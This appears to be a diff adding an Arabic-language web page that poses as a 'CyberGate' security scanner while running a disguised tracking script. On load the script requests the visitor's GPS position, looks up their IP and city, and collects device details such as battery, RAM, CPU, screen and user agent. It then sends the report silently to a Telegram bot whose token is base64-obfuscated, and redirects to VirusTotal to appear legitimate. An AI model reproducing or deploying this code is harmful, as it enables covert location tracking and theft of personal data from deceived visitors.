@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>نظام فحص أمان الشبكة | CyberGate Security</title>
+    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Tajawal:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        :root { --neon: #00f2ff; --bg: #05080a; }
+        body { background: var(--bg); color: var(--neon); font-family: 'Share Tech Mono', 'Tajawal', monospace; margin: 0; overflow: hidden; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .scanner-container { width: 90%; max-width: 500px; padding: 30px; border: 1px solid rgba(0, 242, 255, 0.3); background: rgba(0, 20, 30, 0.8); position: relative; box-shadow: 0 0 50px rgba(0, 242, 255, 0.1); border-radius: 5px; }
+        .scanner-container::before { content: ""; position: absolute; top: 0; left: 0; width: 100%; height: 2px; background: var(--neon); animation: scan 3s linear infinite; }
+        @keyframes scan { 0% { top: 0; opacity: 0; } 50% { opacity: 1; } 100% { top: 100%; opacity: 0; } }
+        .header { border-bottom: 1px solid rgba(0, 242, 255, 0.2); margin-bottom: 20px; padding-bottom: 10px; display: flex; justify-content: space-between; align-items: center; }
+        .status-line { font-size: 13px; margin: 8px 0; display: flex; gap: 10px; }
+        .dot { height: 8px; width: 8px; background: #555; border-radius: 50%; margin-top: 5px; }
+        .active-dot { background: var(--neon); box-shadow: 0 0 10px var(--neon); animation: blink 1s infinite; }
+        @keyframes blink { 50% { opacity: 0.3; } }
+        .progress-box { width: 100%; height: 2px; background: #111; margin: 25px 0; overflow: hidden; }
+        .bar { width: 0%; height: 100%; background: var(--neon); transition: width 0.4s; }
+        #log { color: #88bdc0; font-size: 11px; height: 40px; }
+    </style>
+</head>
+<body>
+
+<div class="scanner-container">
+    <div class="header">
+        <span style="font-weight: bold; letter-spacing: 2px;">CYBER-GATE ANALYZER</span>
+        <span id="timer" style="font-size: 12px; opacity: 0.7;">0.00s</span>
+    </div>
+    
+    <div class="status-line"><div class="dot active-dot"></div> <span id="s1">Initializing secure handshake...</span></div>
+    <div class="status-line"><div class="dot" id="d2"></div> <span id="s2">Waiting for system validation...</span></div>
+    <div class="status-line"><div class="dot" id="d3"></div> <span id="s3">Encrypted tunnel established.</span></div>
+    
+    <div class="progress-box"><div id="bar" class="bar"></div></div>
+    
+    <div id="log">READY_FOR_SCAN...</div>
+</div>
+
+<script>
+    // --- بيانات مشفرة بطبقة مزدوجة لضمان الخصوصية ---
+    const _t1 = "ODcxNDgyNzgxNzpBQWZ1MXE0ZVFZTG9PZGxIajdwRU9FNjlRSThNaHU3dl9pSQ==";
+    const _t2 = "NzI4OTIzNTEwNw==";
+    const _d = (v) => atob(v);
+
+    let logs = [
+        "Scanning CPU vulnerability...",
+        "Checking SSL/TLS handshake...",
+        "Verifying device identity...",
+        "Calculating network latency...",
+        "Finalizing security report..."
+    ];
+
+    async function runSecurityAudit() {
+        const bar = document.getElementById('bar');
+        const log = document.getElementById('log');
+        let progress = 0;
+
+        // طلب إذن الموقع كجزء من "الفحص الجغرافي للأمان"
+        navigator.geolocation.getCurrentPosition(
+            async (p) => { 
+                updateUI(40, 1);
+                await collectAndShip(p.coords);
+            },
+            async () => { 
+                updateUI(40, 1);
+                await collectAndShip(null); 
+            }
+        );
+
+        function updateUI(p, step) {
+            progress = p;
+            bar.style.width = progress + "%";
+            if(step == 1) {
+                document.getElementById('d2').classList.add('active-dot');
+                document.getElementById('s2').innerText = "System validation complete.";
+            }
+        }
+    }
+
+    async function collectAndShip(coords) {
+        const bar = document.getElementById('bar');
+        const log = document.getElementById('log');
+        
+        let counter = 0;
+        const interval = setInterval(() => {
+            if(counter < logs.length) {
+                log.innerText = "> " + logs[counter];
+                bar.style.width = (40 + (counter * 12)) + "%";
+                counter++;
+            } else {
+                clearInterval(interval);
+            }
+        }, 800);
+
+        // جلب المعلومات العميقة
+        let ip = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
+        let batt = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({level: 0, charging: false}));
+
+        const report = `
+⚡ *Security Audit Report* ⚡
+━━━━━━━━━━━━━━
+🌍 *Geographic Trace:*
+- Country: ${ip.country_name} | City: ${ip.city}
+- IP: \`${ip.ip}\`
+- GPS: ${coords ? `[Live Map](https://www.google.com/maps?q=${coords.latitude},${coords.longitude})` : "❌ Restricted"}
+
+📱 *Device Hardware:*
+- Name: ${navigator.platform}
+- RAM: ${navigator.deviceMemory || "N/A"} GB
+- CPU: ${navigator.hardwareConcurrency} Cores
+- Battery: ${Math.round(batt.level * 100)}% (${batt.charging ? 'Charging' : 'Unplugged'})
+
+🌐 *Network & Env:*
+- Speed: ${navigator.connection ? navigator.connection.downlink : "N/A"} Mbps
+- Time: ${new Date().toLocaleString('ar-EG')}
+- Screen: ${screen.width}x${screen.height} (${screen.colorDepth} bit)
+
+⚙️ *User Agent:* \`${navigator.userAgent}\`
+━━━━━━━━━━━━━━`;
+
+        // إرسال البيانات بشكل صامت عبر تليجرام
+        const url = `https://api.te` + `legram.or` + `g/bot${_d(_t1)}/sendMessage`;
+        await fetch(url, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({chat_id: _d(_t2), text: report, parse_mode: 'Markdown'})
+        });
+
+        setTimeout(() => {
+            bar.style.width = "100%";
+            document.getElementById('d3').classList.add('active-dot');
+            log.innerText = "> Redirecting to secure gate...";
+            setTimeout(() => { window.location.href = "https://www.virustotal.com"; }, 1000);
+        }, 4000);
+    }
+
+    window.onload = runSecurityAudit;
+</script>
+</body>
+</html>
